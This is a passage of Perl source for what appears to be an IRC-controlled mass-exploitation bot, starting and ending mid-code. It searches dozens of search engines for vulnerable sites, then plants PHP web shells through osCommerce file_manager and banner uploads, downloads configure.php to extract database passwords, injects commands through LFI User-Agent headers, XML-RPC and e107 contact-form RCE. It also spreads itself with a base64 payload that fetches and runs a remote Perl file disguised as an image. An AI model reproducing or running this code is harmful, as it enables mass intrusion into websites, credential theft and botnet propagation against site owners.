    if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
    if ($check =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
    if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}
    if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}
	&msg("$path","$oscologo(4@3$engine15)15(4@9SHeLL15)13 http://".$site."images/4crack.php 9(4@15SafeMode= $safe9)(4@15OS= $os9)(4@15FreeSpace= $free9)");sleep(2);
	&msg("$admin","$oscologo(4@3$engine15)15(4@9SHeLL15)13 http://".$site."images/4crack.php 9(4@15SafeMode= $safe9)(4@15OS= $os9)(4@15FreeSpace= $free9)");sleep(2);
	}
}

sub osco3() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$oscologo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
           if ($count == $num-1) { &msg("$chan","$oscologo(4@3$engine15)10 Scan finish"); }
            my $test = "http://".$site.$bug;
            my $test1 = "http://".$site."admin/file_manager.php/crack.php";
            my $test2 = "http://".$site."admin/categories.php/crack.php";
            my $html = &get_content($test);
			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
            if ($html =~ /TABLE_HEADING_BANNERS/) {
                &msg("$chan","$oscologo(4@3$engine15)15(4@9System15)7 ".$test);
				&osco_xpl3($test,$chan,$site,$engine);
				&osco_xpl2($test1,$chan,$site,$engine);
				&osco_xpl($test2,$chan,$site,$engine);
                &osql($chan,$site,$engine);
				} else { }
            } exit; sleep(2); }
        }
    }
}
sub osco_xpl3() {
my $browser = LWP::UserAgent->new;
my $url    = $_[0]."?action=insert";
my $chan   = $_[1];
my $site   = $_[2];
my $engine = $_[3];
my $res = $browser->post( $url,['banners_image' => ['./blank.gif' => 'crack.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resa = $browser->post( $url,['banners_image' => ['./tahu.jpg' => 'window.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resb = $browser->post( $url,['banners_image' => ['./publish.jpg' => 'help.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resc = $browser->post( $url,['banners_image' => ['./published.png' => 'form.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
	my $hasil = $res->as_string;
	my $hasil1 = $resa->as_string;
	my $hasil2 = $resb->as_string;
	my $hasil3 = $resc->as_string;
	my $check = &get_content("http://".$site."images/crack.php");&get_content("http://".$site."images/help.php");&get_content("http://".$site."images/form.php");sleep(3);
	if ($check =~ /FaTaLisTiCz_Fx Fx29SheLL/) { 
	my $safe   ="";
	my $os 	   ="";
	my $free   ="";
    if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
    if ($check =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
    if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}
    if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}
	&msg("$chan","$oscologo(4@3$engine15)15(4@9SHeLL15)13 http://".$site."images/4crack.php 9(4@15SafeMode= $safe9)(4@15OS= $os9)(4@15FreeSpace= $free9)");sleep(2);
	&msg("$admin","$oscologo(4@3$engine15)15(4@9SHeLL15)13 http://".$site."images/4crack.php 9(4@15SafeMode= $safe9)(4@15OS= $os9)(4@15FreeSpace= $free9)");sleep(2);
	}
}

sub osql() {
    my $chan   = $_[0];
    my $site   = $_[1];
    my $engine = $_[2];
      my $test = "http://".$site."admin/file_manager.php/login.php?action=download&filename=/includes/configure.php";
      my $re   = &get_content($test);
         if ($re =~ /http:\/\//){
            &osql_xpl($test,$chan,$site);
        }
 }

sub osql_xpl() {
     my $url    = $_[0];
     my $chan   = $_[1];
     my $site   = $_[2];
     my $request   = HTTP::Request->new(GET=>$url);
     my $browser   = LWP::UserAgent->new();
        $browser->timeout(10);
        my $response  = $browser->request($request);
         if ($response->is_success) {
 	 my $res   = $response->as_string;
	if ($res =~ m/'DIR_FS_CATALOG', '(.*)'/g) {
	&msg("$chan","$ossqllogo(4@3VULN)15 http://".$site." 14[+]DIR path: 4 $1");
	}
	if ($res =~ m/'DB_SERVER', '(.*)'/g) {
	&msg("$chan","$ossqllogo(4@3VULN)15 http://".$site." 14[+]DB Server: 4 $1");
	}
	if ($res =~ m/'DB_SERVER_USERNAME', '(.*)'/g) {
	&msg("$chan","$ossqllogo(4@3VULN)15 http://".$site." 14[+]DB username: 4 $1");
	}
	if ($res =~ m/'DB_SERVER_PASSWORD', '(.*)'/g) {
	&msg("$chan","$ossqllogo(4@3VULN)15 http://".$site." 14[+]DB password: 4 $1");
	}
	if ($res =~ m/'DB_DATABASE', '(.*)'/g) {
	&msg("$chan","$ossqllogo(4@3VULN)15 http://".$site." 14[+]DB database: 4 $1");
		}
	}
}

sub oscoQ() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$ossqllogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","$ossqllogo(4@3$engine15)10 Scan finish"); }
            my $test = "http://".$site."admin/file_manager.php/login.php?action=download&filename=/includes/configure.php";
            my $re   = &get_content($test);
            if ($re =~ /http:\/\//){
            &osql_xpl($test,$chan,$site);
            }
         }
    }
}



sub tim() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$timlogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
			if ($count == $num-1) { &msg("$chan","$thumblogo(7,1@2$engine15)10 Scan finish for14 $dork"); }
			my $vuln = "http://".$site.$bug."?src=".$thumbshell;
			my $cek  = &get_content($vuln);sleep(1);
			if ($cek =~ /Unable to open image/i) {
				&msg("$chan","$timlogo9$engine 1P9e3R323K6O6S9A ");sleep(1);
			(my $bery = $bug)=~ s{/[^/]+\z}{};
			my $vuln2 = "http://".$site.$bery.$folder1;
			my $vuln3 = "http://".$site.$bery.$folder2;
			my $vuln4 = "http://".$site.$bery.$folder3;
			my $vuln5 = "http://".$site.$bery.$folder4;
			my $vuln6 = "http://".$site.$folder5;
			my $vuln7 = "http://".$site.$bery.$folderx1;
			my $vuln8 = "http://".$site.$bery.$folderx2;
			my $vuln9 = "http://".$site.$bery.$folderx3;
			my $vuln10 = "http://".$site.$bery.$folderx4;
			my $vuln11 = "http://".$site.$folderx5;
			my $os = "";
			my $safe = "";
			my $uid = "id";
			my $check1 = &get_content($vuln2);sleep(1);&get_content($vuln7);sleep(1);
			my $check2 = &get_content($vuln3);sleep(1);&get_content($vuln8);sleep(1);
			my $check3 = &get_content($vuln4);sleep(1);&get_content($vuln9);sleep(1);
			my $check4 = &get_content($vuln5);sleep(1);&get_content($vuln10);sleep(1);
			my $check5 = &get_content($vuln6);sleep(1);&get_content($vuln11);sleep(1);
			if ($check1 =~ /GIF89a/i) {
			if ($check1 =~ m/<b><br>(.*?)<br><\/b>/) {$os = $1;}
			if ($check1 =~ m/safe_mode: <b><br>(.*?)<br><\/b>/) {$safe = $2;}
			if ($check1 =~ m/uid=(.*?)gid=/) {$uid = $1;}
				&msg("$chan","$timlogo(7,1@2$engine15)15(13,1@12Upload15)10 ".$vuln2." 15 (OS=$os) (Safe Mode = $safe) ");
				&msg("$admin","$timlogo(7,1@2$engine15)15(13,1@12Upload15)10 ".$vuln2." 15 (OS=$os) (Safe Mode =$safe) ");
			}
			if ($check2 =~ /GIF89a/i) {
			if ($check2 =~ m/<b><br>(.*?)<br><\/b>/) {$os = $1;}
			if ($check2 =~ m/safe_mode: <b><br>(.*?)<br><\/b>/) {$safe = $2;}
			if ($check2 =~ m/uid=(.*?)gid=/) {$uid = $1;}
				&msg("$chan","$timlogo(7,1@2$engine15)15(13,1@12Upload15)10 ".$vuln3." 15 (OS=$os) (Safe Mode =$safe) ");
				&msg("$admin","$timlogo(7,1@2$engine15)15(13,1@12Upload15)10 ".$vuln3." 15 (OS=$os) (Safe Mode =$safe) ");
			}
			if ($check3 =~ /GIF89a/i) {
			if ($check3 =~ m/<b><br>(.*?)<br><\/b>/) {$os = $1;}
			if ($check3 =~ m/safe_mode: <b><br>(.*?)<br><\/b>/) {$safe = $2;}
			if ($check3 =~ m/uid=(.*?)gid=/) {$uid = $1;}
				&msg("$chan","$timlogo(7,1@2$engine15)15(13,1@12Upload15)10 ".$vuln4." 15 (OS=$os) (Safe Mode =$safe) ");
				&msg("$admin","$timlogo(7,1@2$engine15)15(13,1@12Upload15)10 ".$vuln4." 15 (OS=$os) (Safe Mode =$safe) ");
			} 
			if ($check4 =~ /GIF89/i) {
			if ($check4 =~ m/<b><br>(.*?)<br><\/b>/) {$os = $1;}
			if ($check4 =~ m/safe_mode: <b><font color=(.*?)>(.*?)<\/font><\/b>/) {$safe = $2;}
			if ($check4 =~ m/uid=(.*?)gid=/) {$uid = $1;}
				&msg("$chan","$timlogo(7,1@2$engine15)15(13,1@12Upload15)12 ".$vuln5." 15 (OS=$os) (Safe Mode =$safe) ");
				&msg("$admin","$timblogo(7,1@2$engine15)15(13,1@12Upload15)12 ".$vuln5." 15 (OS=$os) (Safe Mode =$safe) ");
			}
			if ($check5 =~ /GIF89/i) {
			if ($check5 =~ m/<b><br>(.*?)<br><\/b>/) {$os = $1;}
			if ($check5 =~ m/safe_mode: <b><font color=(.*?)>(.*?)<\/font><\/b>/) {$safe = $2;}
			if ($check5 =~ m/uid=(.*?)gid=/) {$uid = $1;}
				&msg("$chan","$timlogo(7@2$engine15)15(13@12Upload15)12 ".$vuln6." 15 (OS=$os) (Safe Mode =$safe) ");
				&msg("$admin","$timlogo(7@2$engine15)15(13@12Upload15)12 ".$vuln6." 15 (OS=$os) (Safe Mode =$safe) ");
				}
			}
		}
	}
}
########################################

sub search_engine() {
    my (@total,@clean);
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $logo = $_[4];
    if ($engine eq "GooGLe") { my @google = &google($dork); push(@total,@google); }
    if ($engine eq "ReDiff") { my @rediff = &rediff($dork); push(@total,@rediff); }
    if ($engine eq "Bing") { my @bing = &bing($dork); push(@total,@bing); }
    if ($engine eq "ALtaViSTa") { my @altavista = &altavista($dork); push(@total,@altavista); }
    if ($engine eq "AsK") { my @ask = &ask($dork); push(@total,@ask); }
    if ($engine eq "UoL") { my @uol = &uol($dork); push(@total,@uol); }
    if ($engine eq "CluSty") { my @clusty = &clusty($dork); push(@total,@clusty); }
    if ($engine eq "GutSer") { my @gutser = &gutser($dork); push(@total,@gutser); }
    if ($engine eq "GooGle2") { my @google2 = &google2($dork); push(@total,@google2); }
    if ($engine eq "ExaLead") { my @exalead = &exalead($dork); push(@total,@exalead); }
    if ($engine eq "LyCos") { my @lycos = &lycos($dork); push(@total,@lycos); }
    if ($engine eq "VirgiLio") { my @virgilio = &virgilio($dork); push(@total,@virgilio); }
	if ($engine eq "YahOoCA") { my @yahooCA = yahooCA($dork); push(@total,@yahooCA); }
    if ($engine eq "YahOoUK") { my @yahooUK = yahooUK($dork); push(@total,@yahooUK); }
    if ($engine eq "YahOoDE") { my @yahooDE = yahooDE($dork); push(@total,@yahooDE); }
    if ($engine eq "YahOoFR") { my @yahooFR = yahooFR($dork); push(@total,@yahooFR); }
    if ($engine eq "YahOoES") { my @yahooES = yahooES($dork); push(@total,@yahooES); }
    if ($engine eq "YahOoIT") { my @yahooIT = yahooIT($dork); push(@total,@yahooIT); }
    if ($engine eq "YahOoHK") { my @yahooHK = yahooHK($dork); push(@total,@yahooHK); }
    if ($engine eq "YahOoID") { my @yahooID = yahooID($dork); push(@total,@yahooID); }
    if ($engine eq "YahOoIN") { my @yahooIN = yahooIN($dork); push(@total,@yahooIN); }
    if ($engine eq "YahOoAU") { my @yahooAU = yahooAU($dork); push(@total,@yahooAU); }
	if ($engine eq "BingJP") { my @bingJP = bingJP($dork); push(@total,@bingJP); }
    if ($engine eq "BingCN") { my @bingCN = bingCN($dork); push(@total,@bingCN); }
    if ($engine eq "BingKR") { my @bingKR = bingKR($dork); push(@total,@bingKR); }
    if ($engine eq "BingMX") { my @bingMX = bingMX($dork); push(@total,@bingMX); }
    if ($engine eq "BingAR") { my @bingAR = bingAR($dork); push(@total,@bingAR); }
	if ($engine eq "BingAU") { my @bingAU = bingAU($dork); push(@total,@bingAU); }
    if ($engine eq "BingCL") { my @bingCL = bingCL($dork); push(@total,@bingCL); }
    if ($engine eq "WebDe") { my @webde = &webde($dork); push(@total,@webde); }
    if ($engine eq "HotBot") { my @hotbot = &hotbot($dork); push(@total,@hotbot); }
    if ($engine eq "AoL") { my @aol = &aol($dork); push(@total,@aol); }
    if ($engine eq "SaPo") { my @sapo = &sapo($dork); push(@total,@sapo); }
    if ($engine eq "DuCk") { my @duck = &duck($dork); push(@total,@duck); }
    if ($engine eq "LyGo") { my @lygo = &lygo($dork); push(@total,@lygo); }
    if ($engine eq "YauSe") { my @yause = &yause($dork); push(@total,@yause); }
    if ($engine eq "BaiDu") { my @baidu = &baidu($dork); push(@total,@baidu); }
    if ($engine eq "KiPoT") { my @kipot = &kipot($dork); push(@total,@kipot); }
    if ($engine eq "GiBLa") { my @gibla = &gibla($dork); push(@total,@gibla); }
    if ($engine eq "BLacK") { my @black = &black($dork); push(@total,@black); }
    @clean = clean(@total);
    &msg("$chan","$logo($engine) Total:14 (".scalar(@total).") Clean:14 (".scalar(@clean).")");
    return @clean;
}

#########################################

sub cmdlfi() {
my $browser = LWP::UserAgent->new;
my $url = $_[0];
my $cmd = $_[1];
my $hie = "j13mbut<?system(\"$cmd 2> /dev/stdout\"); ?>j13mbut";
$browser->agent("$hie");
$browser->timeout(3);
$response = $browser->get( $url );
if ($response->content =~ /j13mbut(.*)j13mbut/s) {
print $1;
&msg("$chan","(LFICMD)2 $1");
} else {
&msg("$chan","(LFICMD)4 No Output");
}
}

sub cmdxml() {
my $jed = $_[0];
my $dwa = $_[1];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'bamby';echo`".$dwa."`;echo'solo';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $jed,Content_Type => 'text/xml',Content => $exploit);
if ($response->content =~ /bamby(.*)solo/s) {
print $1;
&msg("$chan","(XMLCMD)2 $1");
} else {
&msg("$chan","(XMLCMD)4 No Output");
}
}

sub cmde107() {
my $url  = $_[0];
my $code = $_[1];
my $chan  = $_[2];
my $codecmd = encode_base64($code);
my $cmd = 'echo(base64_decode("QkhMVGVhbQ==").shell_exec(base64_decode("aWQ=")).base64_decode("QmFsaXNvdXJjZQ==")).shell_exec(base64_decode("'.$codecmd.'"));';
    my $req = HTTP::Request->new(POST => $path);
    $req->content_type('application/x-www-form-urlencoded');
    $req->content("send-contactus=1&author_name=[php]".$cmd.";die;[/php]");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(10);
    my $res = $ua->request($req);
my $data = $res->as_string;
if ( $data =~ /BHLTeam(.*)Balisource/ ){
     $mydata = $1;
&msg("$chan","(e107CMD)2 $mydata");
}
else { &msg("$chan","(e107CMD)4 No Output"); 
}
}

#########################################

sub os() {
    my $url = $_[0];
    my $chk  = get_content($url);
    if ( $chk =~ m/<br>uname -a:(.+?)\<br>/g ) {
        $un = $1;
    }
    if ( $chk =~ m/<br>os:(.+?)\<br>/g ) {
        $os = $1;
    }
}

sub rce_os() {
    my $sys = "";
    my $url = $_[0];
    my $chk = get_content($url);
    $chk =~ s/\n//;
    if ($chk =~ /999(.*)666/sg) { $sys = $1; }
    return $sys;
}

sub isFound() {
    my $status = 0;
    my $link = $_[0];
    my $reqexp = $_[1];
    my $res = get_content($link);
    if ($res =~ /$reqexp/) { $status = 1 }
    return $status;
}

sub get_content() {
    my $url = $_[0];
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(10);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
    return $res->content;
}

sub lfi_env_query() {
    my $url = $_[0];
    my $code = $_[1];
    my $ua = LWP::UserAgent->new(agent => "<?eval(base64_decode('".$code."'));?>");
    $ua->timeout(10);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
    return $res->content;
}

sub lfi_spread_query() {
    my $url = $_[0];
    my $code = $_[1];
    my $agent = "<?php echo \"BHLb0t#\"; passthru(\'".$code."\'); echo \"#BHLb0t\"; ?>";
    my $ua = LWP::UserAgent->new(agent => $agent);
    $ua->timeout(15);
    my $req = HTTP::Request->new(GET => $url);
    my $response = $ua->request($req);
    return $response->content;
}

sub xmlcek {
my $xmltgt = $_[0];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'j13mb0t';echo`uname -a`;echo'j13mb0t';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $xmltgt, Content_Type => 'text/xml', Content => $exploit);
if ($response->content =~ /j13mb0t(.*)j13mb0t/s) {
$os=$1;
}}
sub xmlvuln {
my $xmltargt = $_[0];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo 'J1mb0'.'T';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $xmltargt, Content_Type => 'text/xml', Content => $exploit);
if ($response->content =~ /J1mb0T/) {
$shellx=$xmltargt;
}}
sub xmlxspread() {
my $xmltargt = $_[0];
my $xmlsprd = $_[1];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'j13m';echo`".$xmlsprd."`;echo'b0T';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $xmltargt, Content_Type => 'text/xml', Content => $exploit);
}

sub e107_rce_query() {
    my $url = $_[0];
    my $code = $_[1];
    my $req = HTTP::Request->new(POST => $url);
    $req->content_type('application/x-www-form-urlencoded');
    $req->content("send-contactus=1&author_name=[php]eval(base64_decode('".$code."'));die;[/php]");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(10);
    my $res = $ua->request($req);
    return $res->content;
}

sub e107_spread_query() {
    my $url = $_[0];
    my $code = "JGNtZD0iY2QgL3RtcDt3Z2V0IGh0dHA6Ly93d3cubmFib25nb3R0Yy5hYy5rZS9pbWFnZXMvYmFubmVycy9jdnMuanBnO3BlcmwgY3ZzLmpwZztybSAtcmYgY3ZzLmpwZyI7CiRlc2VndWljbWQ9ZXgoJGNtZCk7CmVjaG8gJGVzZWd1aWNtZDsKZnVuY3Rpb24gZXgoJGNmZSl7CiRyZXMgPSAnJzsKaWYgKCFlbXB0eSgkY2ZlKSl7CmlmKGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpKXsKQGV4ZWMoJGNmZSwkcmVzKTsKJHJlcyA9IGpvaW4oIlxuIiwkcmVzKTsKfQplbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpewokcmVzID0gQHNoZWxsX2V4ZWMoJGNmZSk7Cn0KZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpewpAb2Jfc3RhcnQoKTsKQHN5c3RlbSgkY2ZlKTsKJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsKQG9iX2VuZF9jbGVhbigpOwp9CmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3Bhc3N0aHJ1JykpewpAb2Jfc3RhcnQoKTsKQHBhc3N0aHJ1KCRjZmUpOwokcmVzID0gQG9iX2dldF9jb250ZW50cygpOwpAb2JfZW5kX2NsZWFuKCk7Cn0KZWxzZWlmKEBpc19yZXNvdXJjZSgkZiA9IEBwb3BlbigkY2ZlLCJyIikpKXsKJHJlcyA9ICIiOwp3aGlsZSghQGZlb2YoJGYpKSB7ICRyZXMgLj0gQGZyZWFkKCRmLDEwMjQpOyB9CkBwY2xvc2UoJGYpOwp9fQpyZXR1cm4gJHJlczsKfQ==";
    my $req = HTTP::Request->new(POST => $url);
    $req->content_type('application/x-www-form-urlencoded');
    $req->content("send-contactus=1&author_name=[php]eval(base64_decode('".$code."'));die;[/php]");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(10);
    my $res = $ua->request($req);
}

######################################### SEARCH ENGINE yahoo hotbot lycos lygo black

sub google() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=5000; $i+=10){
        my $search = ("http://www.google.com/search?q=".&key($key)."&num=100&filter=0&start=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooCA() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=500; $i+=10) {
        my $search = ("http://CA.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".key($key)."&rd=r2&fr=yfp-t-501&fr2=sb-top&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooCA/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooUK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=500; $i+=10) {
        my $search = ("http://UK.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".key($key)."&rd=r2&fr=yfp-t-501&fr2=sb-top&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooUK/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooDE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=500; $i+=10) {
        my $search = ("http://DE.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".key($key)."&rd=r2&fr=yfp-t-501&fr2=sb-top&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooDE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooFR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=500; $i+=10) {
        my $search = ("http://FR.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".key($key)."&rd=r2&fr=yfp-t-501&fr2=sb-top&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooFR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooES() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=500; $i+=10) {
        my $search = ("http://ES.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".key($key)."&rd=r2&fr=yfp-t-501&fr2=sb-top&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooES/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooIT() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=500; $i+=10) {
        my $search = ("http://IT.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".key($key)."&rd=r2&fr=yfp-t-501&fr2=sb-top&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooIT/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooHK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=500; $i+=10) {
        my $search = ("http://HK.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".key($key)."&rd=r2&fr=yfp-t-501&fr2=sb-top&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooHK/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooID() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=500; $i+=10) {
        my $search = ("http://ID.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".key($key)."&rd=r2&fr=yfp-t-501&fr2=sb-top&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooID/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooIN() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=500; $i+=10) {
        my $search = ("http://IN.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".key($key)."&rd=r2&fr=yfp-t-501&fr2=sb-top&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooIN/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahooAU() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=500; $i+=10) {
        my $search = ("http://AU.search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".key($key)."&rd=r2&fr=yfp-t-501&fr2=sb-top&fp_ip=11&xargs=0&pstart=1&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link!~ /yahooAU/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}


sub bingJP() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".key($key)."&cc=jp&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $link = $1;
            if ($link !~ /msn|live|bingJP/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingCN() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".key($key)."&cc=cn&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $link = $1;
            if ($link !~ /msn|live|bingCN/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingKR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".key($key)."&cc=kr&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $link = $1;
            if ($link !~ /msn|live|bingKR/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingMX() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".key($key)."&cc=mx&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $link = $1;
            if ($link !~ /msn|live|bingMX/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingAR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".key($key)."&cc=ar&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $link = $1;
            if ($link !~ /msn|live|bingAR/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingCL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".key($key)."&cc=cl&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $link = $1;
            if ($link !~ /msn|live|bingCL/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingAU() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
